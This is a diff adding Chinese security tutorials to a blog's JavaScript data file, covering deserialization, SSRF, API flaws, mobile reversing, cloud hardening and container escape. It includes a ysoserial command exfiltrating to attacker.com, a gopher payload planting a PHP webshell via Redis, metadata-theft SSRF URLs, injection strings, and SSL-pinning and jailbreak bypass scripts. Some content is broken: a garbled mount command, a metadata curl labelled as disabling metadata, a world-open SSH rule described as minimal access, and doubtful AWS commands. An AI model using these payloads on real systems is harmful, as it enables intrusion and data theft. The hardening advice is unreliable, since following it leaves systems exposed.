@@ -80,6 +80,40 @@ export const categories = [
       { id: 'wireshark-tool', name: 'Wireshark' },
     ]
   },
+  {
+    id: 'websec-advanced',
+    name: 'Web安全进阶',
+    icon: '🔐',
+    children: [
+      { id: 'deserialization', name: '反序列化漏洞' },
+      { id: 'ssrf', name: 'SSRF 服务端请求伪造' },
+      { id: 'logic-vuln', name: '逻辑漏洞' },
+      { id: 'api-security', name: 'API 安全' },
+      { id: 'wasm', name: 'WebAssembly 逆向' },
+    ]
+  },
+  {
+    id: 'mobile',
+    name: '移动端安全',
+    icon: '📱',
+    children: [
+      { id: 'android-reverse', name: 'Android 逆向' },
+      { id: 'android-pentest', name: 'Android 渗透测试' },
+      { id: 'ios-reverse', name: 'iOS 逆向基础' },
+      { id: 'miniapp-pentest', name: '小程序渗透' },
+    ]
+  },
+  {
+    id: 'cloud',
+    name: '云安全',
+    icon: '☁️',
+    children: [
+      { id: 'aws-security', name: 'AWS 安全配置' },
+      { id: 'docker-security', name: 'Docker 安全' },
+      { id: 'k8s-security', name: 'Kubernetes 安全' },
+      { id: 'container-escape', name: '容器逃逸' },
+    ]
+  },
 ]
 
 export const posts = [
@@ -1414,6 +1448,1376 @@ requests:
 | -o | 输出文件 |
 | -json | JSON格式输出 |
     `
+  },
+  // Web安全进阶
+  {
+    slug: 'deserialization',
+    title: '反序列化漏洞详解',
+    date: '2026-06-19',
+    category: 'websec-advanced',
+    subcategory: 'deserialization',
+    tags: ['Web安全', '反序列化', 'Java', 'PHP'],
+    summary: '各语言反序列化漏洞原理和利用方法。',
+    content: `
+## 什么是反序列化漏洞
+
+反序列化是将序列化的数据恢复为对象的过程。当应用不安全地反序列化用户输入时，攻击者可构造恶意对象执行任意代码。
+
+## PHP 反序列化
+
+### 基础概念
+
+\`\`\`php
+// 序列化
+$obj = new User("admin");
+echo serialize($obj);  // O:4:"User":1:{s:4:"name";s:5:"admin";}
+
+// 反序列化
+$data = 'O:4:"User":1:{s:4:"name";s:5:"admin";}';
+$obj = unserialize($data);
+\`\`\`
+
+### 魔术方法
+
+\`\`\`php
+__construct()    // 对象创建时
+__destruct()     // 对象销毁时
+__toString()     // 对象转字符串时
+__wakeup()       // 反序列化时
+__sleep()        // 序列化时
+__call()         // 调用不存在方法时
+\`\`\`
+
+### 利用链构造
+
+\`\`\`php
+class FileHandler {
+    public $filename;
+    public function __destruct() {
+        echo file_get_contents($this->filename);
+    }
+}
+
+// 构造payload
+$a = new FileHandler();
+$a->filename = "/etc/passwd";
+echo serialize($a);
+\`\`\`
+
+## Java 反序列化
+
+### 基础
+
+\`\`\`java
+// 序列化
+ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("obj.ser"));
+oos.writeObject(user);
+
+// 反序列化
+ObjectInputStream ois = new ObjectInputStream(new FileInputStream("obj.ser"));
+Object obj = ois.readObject();
+\`\`\`
+
+### 常见漏洞
+
+- **Apache Commons Collections**
+- **Fastjson**
+- **WebLogic**
+- **Shiro**
+
+### ysoserial 工具
+
+\`\`\`bash
+# 生成payload
+java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin
+
+# 使用
+java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/steal?c=$(whoami)"
+\`\`\`
+
+## PHP 反序列化实战
+
+### 读取文件
+
+\`\`\`php
+class Logger {
+    public $logfile;
+    public function __destruct() {
+        file_put_contents($this->logfile, "logged");
+    }
+}
+
+// 构造payload读取文件
+\`\`\`
+
+### 写入Webshell
+
+\`\`\`php
+class FileWriter {
+    public $filename;
+    public $content;
+    public function __destruct() {
+        file_put_contents($this->filename, $this->content);
+    }
+}
+\`\`\`
+
+## 防御方案
+
+1. 禁用用户输入的反序列化
+2. 使用白名单验证类
+3. 使用 JSON 替代原生序列化
+4. 升级依赖库
+    `
+  },
+  {
+    slug: 'ssrf',
+    title: 'SSRF 服务端请求伪造',
+    date: '2026-06-18',
+    category: 'websec-advanced',
+    subcategory: 'ssrf',
+    tags: ['Web安全', 'SSRF', '内网'],
+    summary: 'SSRF 漏洞原理、利用方式和防御方案。',
+    content: `
+## 什么是 SSRF
+
+SSRF（Server-Side Request Forgery）服务端请求伪造，攻击者利用服务器发起请求，访问内部资源或绕过防火墙。
+
+## 常见触发场景
+
+- 图片加载/上传
+- 钩子/回调功能
+- 文件处理
+- API 代理
+- Webhook
+
+## 利用方式
+
+### 1. 读取本地文件
+
+\`\`\`
+?url=file:///etc/passwd
+?url=file:///c:/windows/win.ini
+\`\`\`
+
+### 2. 扫描内网
+
+\`\`\`
+?url=http://192.168.1.1:8080/
+?url=http://127.0.0.1:3306/
+\`\`\`
+
+### 3. 攻击内网服务
+
+\`\`\`
+?url=http://192.168.1.100/admin
+?url=redis://127.0.0.1:6379/
+\`\`\`
+
+### 4. 云环境元数据
+
+\`\`\`
+# AWS
+?url=http://169.254.169.254/latest/meta-data/
+
+# 阿里云
+?url=http://100.100.100.200/latest/meta-data/
+\`\`\`
+
+## 绕过技巧
+
+### IP 地址变形
+
+\`\`\`
+http://0x7f000001/       # 十六进制
+http://2130706433/       # 十进制
+http://0177.0.0.1/       # 八进制
+http://127.1/            # 省略写法
+http://127.0.0.1.nip.io/ # DNS重绑定
+\`\`\`
+
+### 协议绕过
+
+\`\`\`
+file:///etc/passwd
+gopher://127.0.0.1:6379/
+dict://127.0.0.1:6379/
+\`\`\`
+
+### URL 编码
+
+\`\`\`
+http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
+\`\`\`
+
+## 利用 Gopher 协议攻击 Redis
+
+\`\`\`
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3fphp eval($_POST['cmd']); %3f>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
+\`\`\`
+
+## 防御方案
+
+1. 白名单限制可访问的域名/IP
+2. 禁用不需要的协议（file://、gopher://）
+3. 禁止访问内网地址
+4. 使用网络层隔离
+    `
+  },
+  {
+    slug: 'logic-vuln',
+    title: '逻辑漏洞挖掘',
+    date: '2026-06-16',
+    category: 'websec-advanced',
+    subcategory: 'logic-vuln',
+    tags: ['Web安全', '逻辑漏洞', '业务安全'],
+    summary: '常见业务逻辑漏洞类型和挖掘方法。',
+    content: `
+## 什么是逻辑漏洞
+
+逻辑漏洞是由于程序逻辑设计不当，导致攻击者可以绕过正常业务流程的漏洞。
+
+## 常见类型
+
+### 1. 越权漏洞
+
+#### 水平越权
+\`\`\`
+# 修改用户ID查看他人信息
+GET /api/user/123 → GET /api/user/456
+\`\`\`
+
+#### 垂直越权
+\`\`\`
+# 普通用户访问管理员接口
+GET /admin/dashboard
+\`\`\`
+
+### 2. 支付漏洞
+
+#### 价格篡改
+\`\`\`
+# 修改价格参数
+amount=100 → amount=0.01
+\`\`\`
+
+#### 数量篡改
+\`\`\`
+# 修改购买数量为负数
+quantity=1 → quantity=-1
+\`\`\`
+
+### 3. 验证码漏洞
+
+- 验证码回显在响应中
+- 验证码可重复使用
+- 可爆破验证码
+- 客户端验证
+
+### 4. 短信/邮箱轰炸
+
+\`\`\`
+# 重复发送验证码
+POST /api/send_sms
+phone=13800138000
+# 无频率限制
+\`\`\`
+
+### 5. 数据篡改
+
+\`\`\`
+# 修改请求中的敏感字段
+{"username":"admin", "role":"user"} → {"username":"admin", "role":"admin"}
+\`\`\`
+
+### 6. 竞态条件
+
+\`\`\`
+# 并发请求导致重复操作
+同时发送两个购买请求 → 扣款一次，获得两件商品
+\`\`\`
+
+### 7. 回调地址
+
+\`\`\`
+# 修改回调URL
+callback=http://attacker.com/steal
+\`\`\`
+
+## 接口测试
+
+### 参数篡改
+- 修改用户ID、订单号
+- 修改价格、数量
+- 修改角色、权限
+
+### 流程跳过
+- 跳过验证步骤
+- 跳过支付步骤
+- 跳过授权步骤
+
+### 重放攻击
+- 重复使用验证码
+- 重复使用优惠券
+- 重复提交订单
+
+## 工具
+
+- Burp Suite
+- Postman
+- YAKIT
+
+## 防御方案
+
+1. 服务端校验所有参数
+2. 使用不可预测的ID（UUID）
+3. 关键操作二次验证
+4. 限制请求频率
+5. 使用签名防篡改
+    `
+  },
+  {
+    slug: 'api-security',
+    title: 'API 安全测试',
+    date: '2026-06-14',
+    category: 'websec-advanced',
+    subcategory: 'api-security',
+    tags: ['Web安全', 'API', 'REST', 'GraphQL'],
+    summary: 'API 接口安全测试方法和常见漏洞。',
+    content: `
+## API 安全风险
+
+### 1. 未授权访问
+
+\`\`\`
+# 无认证直接访问
+GET /api/users/123
+GET /api/admin/config
+\`\`\`
+
+### 2. 越权访问
+
+\`\`\`
+# 水平越权
+GET /api/users/456  # 查看其他用户数据
+
+# 垂直越权
+GET /api/admin/users  # 普通用户访问管理接口
+\`\`\`
+
+### 3. 注入漏洞
+
+\`\`\`json
+// SQL注入
+{"username": "admin' OR '1'='1"}
+
+// NoSQL注入
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+
+// 命令注入
+{"name": "test; whoami"}
+\`\`\`
+
+### 4. 批量赋值
+
+\`\`\`json
+// 修改不应被修改的字段
+{
+  "username": "normaluser",
+  "role": "admin",      // 不应可修改
+  "balance": 1000000    // 不应可修改
+}
+\`\`\`
+
+### 5. 速率限制绕过
+
+\`\`\`
+# 使用不同IP
+X-Forwarded-For: 1.1.1.1
+
+# 使用不同User-Agent
+User-Agent: Mobile
+
+# 使用不同参数
+?phone=13800138000
+?phone=13800138001
+\`\`\`
+
+## REST API 测试
+
+### 常见检查点
+
+| 方法 | 检查点 |
+|------|--------|
+| GET | 越权访问、数据泄露 |
+| POST | 注入、批量赋值 |
+| PUT | 越权修改、数据篡改 |
+| DELETE | 越权删除 |
+| OPTIONS | CORS配置 |
+
+### HTTP 头检查
+
+\`\`\`
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+\`\`\`
+
+## GraphQL 安全
+
+### 内省查询
+
+\`\`\`graphql
+{
+  __schema {
+    types {
+      name
+      fields {
+        name
+      }
+    }
+  }
+}
+\`\`\`
+
+### 常见漏洞
+
+- 内省查询泄露API结构
+- 批量查询导致DoS
+- 注入漏洞
+
+## JWT 安全
+
+### 常见问题
+
+\`\`\`
+# 算法混淆
+{"alg": "none"}
+
+# 弱密钥
+HS256 使用弱密钥
+
+# 密钥泄露
+\`\`\`
+
+### 检查命令
+
+\`\`\`bash
+# JWT解析
+jwt_tool token.txt
+
+# 爆破密钥
+hashcat -m 16500 jwt.txt wordlist.txt
+\`\`\`
+
+## 防御方案
+
+1. 实施认证和授权
+2. 输入验证
+3. 速率限制
+4. 日志监控
+5. 使用 HTTPS
+6. API 网关
+    `
+  },
+  {
+    slug: 'wasm-reverse',
+    title: 'WebAssembly 逆向入门',
+    date: '2026-06-12',
+    category: 'websec-advanced',
+    subcategory: 'wasm',
+    tags: ['Web安全', 'WASM', '逆向'],
+    summary: 'WebAssembly 逆向分析基础。',
+    content: `
+## 什么是 WebAssembly
+
+WebAssembly（WASM）是一种可移植的二进制格式，可在浏览器中运行。常用于保护前端敏感逻辑。
+
+## WASM 文件分析
+
+### 识别 WASM
+
+\`\`\`javascript
+// 检查是否加载了WASM
+const wasmModule = new WebAssembly.Module(buffer);
+console.log(WebAssembly.Module.exports(wasmModule));
+\`\`\`
+
+### 使用 wasm-decompile
+
+\`\`\`bash
+# 安装
+npm install -g wabt
+
+# 反编译
+wasm-decompile module.wasm -o output.c
+\`\`\`
+
+### 使用 wasm-objdump
+
+\`\`\`bash
+# 查看结构
+wasm-objdump -x module.wasm
+
+# 反汇编
+wasm-objdump -d module.wasm
+\`\`\`
+
+## 常见逆向工具
+
+| 工具 | 用途 |
+|------|------|
+| wasm-decompile | 反编译为伪C代码 |
+| wasm-objdump | 查看结构和反汇编 |
+| Ghidra | 二进制分析 |
+| Binary Ninja | 二进制分析 |
+| IDA Pro | 二进制分析 |
+
+## 浏览器调试
+
+### Chrome DevTools
+
+1. 打开 Sources 面板
+2. 找到 WASM 文件
+3. 设置断点调试
+
+### 导出函数分析
+
+\`\`\`javascript
+// 获取WASM导出函数
+const exports = instance.exports;
+console.log(Object.keys(exports));
+\`\`\`
+
+## 逆向流程
+
+1. 定位 WASM 文件
+2. 分析导出函数
+3. 反编译分析逻辑
+4. 找到关键函数
+5. 编写调用脚本
+
+## 实战技巧
+
+\`\`\`javascript
+// Hook WASM函数
+const originalFn = exports.targetFunction;
+exports.targetFunction = function(...args) {
+    console.log('Args:', args);
+    const result = originalFn(...args);
+    console.log('Result:', result);
+    return result;
+};
+\`\`\`
+    `
+  },
+  // 移动端安全
+  {
+    slug: 'android-reverse',
+    title: 'Android 逆向基础',
+    date: '2026-06-15',
+    category: 'mobile',
+    subcategory: 'android-reverse',
+    tags: ['移动端安全', 'Android', '逆向'],
+    summary: 'Android APK 逆向分析基础。',
+    content: `
+## Android 逆向工具
+
+| 工具 | 用途 |
+|------|------|
+| jadx | APK 反编译 |
+| apktool | 资源解包 |
+| dex2jar | DEX 转 JAR |
+| JD-GUI | Java 反编译器 |
+| Frida | 动态Hook |
+| Objection | 移动安全框架 |
+
+## 反编译流程
+
+\`\`\`bash
+# jadx 反编译
+jadx -d output/ target.apk
+
+# apktool 解包
+apktool d target.apk
+
+# dex2jar 转换
+d2j-dex2jar target.apk
+\`\`\`
+
+## 常见保护
+
+### 代码混淆
+
+\`\`\`java
+// 混淆前
+public class UserManager {
+    public void login(String username, String password) { }
+}
+
+// 混淆后
+public class a {
+    public void b(String c, String d) { }
+}
+\`\`\`
+
+### 加壳
+
+- VMP（虚拟机保护）
+- DexProtector
+- 360加固
+- 腾讯乐固
+
+## Frida Hook
+
+### Java Hook
+
+\`\`\`javascript
+// Hook Java 方法
+Java.perform(function() {
+    var UserManager = Java.use("com.target.UserManager");
+    UserManager.login.implementation = function(username, password) {
+        console.log("Username: " + username);
+        console.log("Password: " + password);
+        return this.login(username, password);
+    };
+});
+\`\`\`
+
+### Native Hook
+
+\`\`\`javascript
+// Hook native函数
+Interceptor.attach(Module.findExportByName("libtarget.so", "check"), {
+    onEnter: function(args) {
+        console.log("Arg0: " + Memory.readUtf8String(args[0]));
+    },
+    onLeave: function(retval) {
+        console.log("Return: " + retval);
+        retval.replace(1);  // 修改返回值
+    }
+});
+\`\`\`
+
+## APK 结构
+
+\`\`\`
+target.apk
+├── AndroidManifest.xml    # 配置文件
+├── classes.dex            # DEX代码
+├── resources.arsc         # 资源文件
+├── lib/                   # Native库
+├── assets/                # 资源文件
+└── META-INF/              # 签名信息
+\`\`\`
+
+## 签名绕过
+
+\`\`\`bash
+# 使用apktool解包
+apktool d target.apk
+
+# 修改后重新打包
+apktool b target/
+
+# 签名
+jarsigner -keystore keystore.apk target.apk alias
+\`\`\`
+    `
+  },
+  {
+    slug: 'android-pentest',
+    title: 'Android 渗透测试',
+    date: '2026-06-13',
+    category: 'mobile',
+    subcategory: 'android-pentest',
+    tags: ['移动端安全', 'Android', '渗透测试'],
+    summary: 'Android 应用安全测试方法。',
+    content: `
+## 测试环境搭建
+
+\`\`\`bash
+# 安装ADB
+apt install android-tools-adb
+
+# 连接设备
+adb devices
+adb shell
+
+# 安装APK
+adb install target.apk
+\`\`\`
+
+## 组件安全测试
+
+### Activity 暴露
+
+\`\`\`xml
+<!-- AndroidManifest.xml -->
+<activity android:exported="true" />
+\`\`\`
+
+\`\`\`bash
+# 启动暴露的Activity
+adb shell am start -n com.target/.MainActivity
+\`\`\`
+
+### Service 暴露
+
+\`\`\`bash
+# 启动服务
+adb shell am startservice com.target/.MyService
+\`\`\`
+
+### Content Provider
+
+\`\`\`bash
+# 查询ContentProvider
+adb shell content query --uri content://com.target.provider/data
+\`\`\`
+
+### BroadcastReceiver
+
+\`\`\`bash
+# 发送广播
+adb shell am broadcast -a com.target.ACTION
+\`\`\`
+
+## 数据存储安全
+
+### SharedPreferences
+
+\`\`\`bash
+# 查找SharedPreferences
+adb shell run-as com.target cat /data/data/com.target/shared_prefs/*.xml
+\`\`\`
+
+### SQLite 数据库
+
+\`\`\`bash
+# 查找数据库
+adb shell run-as com.target ls /data/data/com.target/databases/
+
+# 导出数据库
+adb pull /data/data/com.target/databases/app.db
+\`\`\`
+
+## 流量分析
+
+### 使用 BurpSuite
+
+\`\`\`
+1. 配置Burp代理
+2. 安装Burp证书
+3. 设置手机代理
+4. 抓包分析
+\`\`\`
+
+### 使用 Frida
+
+\`\`\`javascript
+// SSL Pinning绕过
+Java.perform(function() {
+    var TrustManager = Java.registerClass({
+        name: "com.target.TrustManager",
+        implements: [Java.use("javax.net.ssl.X509TrustManager")],
+        methods: {
+            checkClientTrusted: function(chain, authType) {},
+            checkServerTrusted: function(chain, authType) {},
+            getAcceptedIssuers: function() { return []; }
+        }
+    });
+});
+\`\`\`
+
+## 常见漏洞
+
+1. 组件暴露
+2. 数据明文存储
+3. 弱加密算法
+4. 不安全的网络通信
+5. 代码可逆向
+    `
+  },
+  {
+    slug: 'ios-reverse',
+    title: 'iOS 逆向基础',
+    date: '2026-06-11',
+    category: 'mobile',
+    subcategory: 'ios-reverse',
+    tags: ['移动端安全', 'iOS', '逆向'],
+    summary: 'iOS 应用逆向分析基础。',
+    content: `
+## iOS 逆向工具
+
+| 工具 | 用途 |
+|------|------|
+| class-dump | 导出类信息 |
+| Hopper | 二进制分析 |
+| IDA Pro | 二进制分析 |
+| Frida | 动态Hook |
+| Reveal | UI分析 |
+| Keychain-Dumper | 钥匙串导出 |
+
+## IPA 文件结构
+
+\`\`\`
+target.ipa
+├── Payload/
+│   └── target.app/
+│       ├── Info.plist
+│       ├── target (Mach-O)
+│       ├── Frameworks/
+│       └── _CodeSignature/
+\`\`\`
+
+## 反编译流程
+
+\`\`\`bash
+# 解压IPA
+unzip target.ipa -d output/
+
+# 导出类信息
+class-dump target.app/target > classes.h
+
+# 使用Hopper分析
+\`\`\`
+
+## 代码签名
+
+\`\`\`bash
+# 查看签名
+codesign -dvvv target.app
+
+# 重签名
+codesign -f -s "iPhone Developer: xxx" target.app
+
+# 使用ios-deploy
+ios-deploy --bundle target.app
+\`\`\`
+
+## Frida Hook
+
+### Objective-C Hook
+
+\`\`\`javascript
+// Hook OC方法
+var_resolver = new ApiResolver("objc");
+var resolver = new ApiResolver("objc");
+resolver.enumerateMatches({
+    pattern: '-[* userController]',
+    onMatch: function(match) {
+        var impl = new NativeFunction(match.address, 'void', ['pointer', 'pointer']);
+        Interceptor.attach(match.address, {
+            onEnter: function(args) {
+                var password = ObjC.Object(args[2]);
+                console.log("Password: " + password.toString());
+            }
+        });
+    }
+});
+\`\`\`
+
+### Swift Hook
+
+\`\`\`javascript
+// Hook Swift函数
+var module = Process.getModuleByName("target");
+module.enumerateSymbols().forEach(function(symbol) {
+    if (symbol.name.indexOf("ViewController") !== -1) {
+        console.log(symbol.name);
+    }
+});
+\`\`\`
+
+## 越狱检测绕过
+
+\`\`\`javascript
+// 常见越狱检测
+var jailbreakChecks = [
+    "/Applications/Cydia.app",
+    "/Library/MobileSubstrate/MobileSubstrate.dylib",
+    "/bin/bash",
+    "/usr/sbin/sshd"
+];
+
+// 绕过
+Interceptor.attach(Module.findExportByName(null, "access"), {
+    onEnter: function(args) {
+        this.path = args[0].readUtf8String();
+    },
+    onLeave: function(retval) {
+        if (this.path && jailbreakChecks.indexOf(this.path) !== -1) {
+            retval.replace(-1);
+        }
+    }
+});
+\`\`\`
+
+## Keychain 分析
+
+\`\`\`bash
+# 导出钥匙串
+iOS/keychain-dumper
+
+# 使用Keychain Dump
+keychain-dumper -a
+\`\`\`
+    `
+  },
+  {
+    slug: 'miniapp-pentest',
+    title: '微信小程序渗透测试',
+    date: '2026-06-10',
+    category: 'mobile',
+    subcategory: 'miniapp-pentest',
+    tags: ['移动端安全', '小程序', '渗透测试'],
+    summary: '微信小程序安全测试方法。',
+    content: `
+## 小程序结构
+
+\`\`\`
+target/
+├── app.js
+├── app.json
+├── app.wxss
+├── pages/
+└── project.config.json
+\`\`\`
+
+## 获取小程序包
+
+### 方法1：模拟器
+
+\`\`\`
+1. 使用PC版微信
+2. 打开小程序
+3. 在文档目录查找wxapkg文件
+\`\`\`
+
+### 方法2：抓包
+
+\`\`\`
+1. 使用BurpSuite抓包
+2. 找到小程序下载链接
+3. 下载wxapkg文件
+\`\`\`
+
+## 反编译
+
+\`\`\`bash
+# 安装工具
+npm install -g wxappUnpacker
+
+# 反编译
+wxappUnpacker target.wxapkg
+
+# 或使用 unveilr
+unveilr target.wxapkg -o output/
+\`\`\`
+
+## 安全测试
+
+### 接口测试
+
+\`\`\`
+1. 找到API接口
+2. 测试未授权访问
+3. 测试参数篡改
+4. 测试注入漏洞
+\`\`\`
+
+### 配置文件
+
+\`\`\`javascript
+// 检查app.json
+{
+  "appid": "wx...",
+  "serverUrl": "https://api.target.com"
+}
+
+// 检查是否有敏感信息
+\`\`\`
+
+### 代码审计
+
+\`\`\`javascript
+// 检查硬编码密钥
+var secret = "1234567890abcdef";
+
+// 检查不安全存储
+wx.setStorageSync('token', token);
+\`\`\`
+
+## 常见漏洞
+
+1. 接口未授权
+2. 敏感信息泄露
+3. 不安全的数据存储
+4. 逻辑漏洞
+5. 注入漏洞
+
+## 工具
+
+- **wxappUnpacker**：反编译
+- **unveilr**：反编译
+- **BurpSuite**：抓包
+- **Fiddler**：抓包
+    `
+  },
+  // 云安全
+  {
+    slug: 'aws-security',
+    title: 'AWS 安全配置指南',
+    date: '2026-06-09',
+    category: 'cloud',
+    subcategory: 'aws-security',
+    tags: ['云安全', 'AWS', '配置'],
+    summary: 'AWS 云环境安全配置最佳实践。',
+    content: `
+## IAM 安全
+
+### 最小权限原则
+
+\`\`\`json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": "s3:GetObject",
+      "Resource": "arn:aws:s3:::bucket/*"
+    }
+  ]
+}
+\`\`\`
+
+### 多因素认证
+
+\`\`\`bash
+# 启用MFA
+aws iam enable-mfa-user --user-name admin --serial-number arn:aws:iam::123456789:mfa/admin
+\`\`\`
+
+## S3 存储桶安全
+
+### 访问控制
+
+\`\`\`bash
+# 检查公开访问
+aws s3api get-bucket-acl --bucket my-bucket
+
+# 禁用公开访问
+aws s3api put-public-access-block --bucket my-bucket --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
+\`\`\`
+
+### 加密
+
+\`\`\`bash
+# 启用默认加密
+aws s3api put-bucket-encryption --bucket my-bucket --server-side-encryption-configuration '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}'
+\`\`\`
+
+## EC2 安全
+
+### 安全组
+
+\`\`\`bash
+# 只开放必要端口
+aws ec2 authorize-security-group-ingress --group-id sg-xxx --protocol tcp --port 22 --cidr 0.0.0.0/0
+\`\`\`
+
+### 实例元数据
+
+\`\`\`bash
+# 禁用元数据（防SSRF）
+curl http://169.254.169.254/latest/meta-data/
+\`\`\`
+
+## CloudTrail
+
+\`\`\`bash
+# 启用日志
+aws cloudtrail create-logging-status --name my-trail --s3-bucket-name my-bucket
+
+# 查看日志
+aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin
+\`\`\`
+
+## 安全工具
+
+- **Prowler**：AWS安全审计
+- **ScoutSuite**：云安全审计
+- **CloudMapper**：AWS架构可视化
+    `
+  },
+  {
+    slug: 'docker-security',
+    title: 'Docker 安全最佳实践',
+    date: '2026-06-08',
+    category: 'cloud',
+    subcategory: 'docker-security',
+    tags: ['云安全', 'Docker', '容器'],
+    summary: 'Docker 容器安全配置和加固。',
+    content: `
+## 镜像安全
+
+### 使用最小基础镜像
+
+\`\`\`dockerfile
+# 使用Alpine
+FROM alpine:3.18
+
+# 避免使用
+FROM ubuntu:latest
+\`\`\`
+
+### 非Root用户
+
+\`\`\`dockerfile
+RUN adduser -D appuser
+USER appuser
+\`\`\`
+
+### 扫描漏洞
+
+\`\`\`bash
+# 使用Trivy
+trivy image nginx:latest
+
+# 使用Snyk
+snyk container test nginx:latest
+\`\`\`
+
+## 运行时安全
+
+### 只读文件系统
+
+\`\`\`bash
+docker run --read-only --tmpfs /tmp nginx
+\`\`\`
+
+### 资源限制
+
+\`\`\`bash
+docker run --memory=512m --cpus=1 nginx
+\`\`\`
+
+### 禁用特权
+
+\`\`\`bash
+# 避免使用
+docker run --privileged nginx
+\`\`\`
+
+## 网络安全
+
+### 使用自定义网络
+
+\`\`\`bash
+docker network create --driver bridge my-network
+docker run --network my-network nginx
+\`\`\`
+
+### 限制容器间通信
+
+\`\`\`bash
+docker run --icc=false nginx
+\`\`\`
+
+## Docker Bench
+
+\`\`\`bash
+# 运行安全检查
+docker run -it --net host --pid host docker/docker-bench-security
+\`\`\`
+
+## 常见风险
+
+1. 特权容器逃逸
+2. 镜像漏洞
+3. 敏感信息泄露
+4. 不安全的网络配置
+5. 资源滥用
+    `
+  },
+  {
+    slug: 'k8s-security',
+    title: 'Kubernetes 安全',
+    date: '2026-06-07',
+    category: 'cloud',
+    subcategory: 'k8s-security',
+    tags: ['云安全', 'Kubernetes', 'K8s'],
+    summary: 'Kubernetes 集群安全配置。',
+    content: `
+## RBAC 权限控制
+
+\`\`\`yaml
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  namespace: default
+  name: pod-reader
+rules:
+- apiGroups: [""]
+  resources: ["pods"]
+  verbs: ["get", "watch", "list"]
+\`\`\`
+
+## Pod 安全
+
+### Security Context
+
+\`\`\`yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: secure-pod
+spec:
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 1000
+  containers:
+  - name: app
+    image: nginx
+    securityContext:
+      allowPrivilegeEscalation: false
+      readOnlyRootFilesystem: true
+\`\`\`
+
+## 网络策略
+
+\`\`\`yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny
+spec:
+  podSelector: {}
+  policyTypes:
+  - Ingress
+  - Egress
+\`\`\`
+
+## Secret 管理
+
+\`\`\`bash
+# 创建Secret
+kubectl create secret generic my-secret --from-literal=password=xxx
+
+# 加密存储
+# 启用加密
+\`\`\`
+
+## 安全审计
+
+\`\`\`bash
+# 检查集群配置
+kube-bench run
+
+# 检查镜像漏洞
+trivy image nginx:latest
+\`\`\`
+
+## 常见攻击面
+
+1. API Server 未授权
+2. etcd 数据泄露
+3. 容器逃逸
+4. 横向移动
+5. 特权提升
+    `
+  },
+  {
+    slug: 'container-escape',
+    title: '容器逃逸技术',
+    date: '2026-06-06',
+    category: 'cloud',
+    subcategory: 'container-escape',
+    tags: ['云安全', '容器逃逸', '渗透测试'],
+    summary: '容器逃逸的常见方法和利用。',
+    content: `
+## 什么是容器逃逸
+
+容器逃逸是指从容器环境突破隔离，获得宿主机权限。
+
+## 逃逸方法
+
+### 1. 特权容器逃逸
+
+\`\`\`bash
+# 检查是否特权
+cat /proc/1/status | grep CapEff
+
+# 挂载宿主机磁盘
+mkdir /tmp/host
+mount /dev/sda1 /tmp/cat /tmp/host/etc/shadow
+\`\`\`
+
+### 2. Docker Socket 挂载
+
+\`\`\`bash
+# 检查是否有docker.sock
+ls -la /var/run/docker.sock
+
+# 使用docker命令
+docker run -v /:/host alpine chroot /host
+\`\`\`
+
+### 3. CVE-2019-5736
+
+\`\`\`bash
+# runc漏洞
+# 覆盖runc二进制文件
+\`\`\`
+
+### 4. CVE-2020-15257
+
+\`\`\`bash
+# containerd漏洞
+# 通过containerd-shim逃逸
+\`\`\`
+
+### 5. _procfs 逃逸
+
+\`\`\`bash
+# 挂载/proc
+mount -t proc proc /proc
+
+# 获取宿主机进程信息
+\`\`\`
+
+### 6. cgroup 逃逸
+
+\`\`\`bash
+# 利用cgroup执行命令
+\`\`\`
+
+## 检测方法
+
+\`\`\`bash
+# 检查容器逃逸痕迹
+cat /proc/1/cgroup
+ls -la /proc/1/ns/
+
+# 检查挂载点
+mount | grep -v "overlay|proc|sys|dev"
+\`\`\`
+
+## 防御方案
+
+1. 不使用特权容器
+2. 不挂载Docker Socket
+3. 使用只读文件系统
+4. 限制容器能力
+5. 定期更新容器运行时
+
+## 工具
+
+- **CDK**：容器渗透工具
+- **Breach**：容器安全审计
+- **Deepce**：容器枚举
+     `
   },
   {
     slug: 'cobaltstrike-guide',
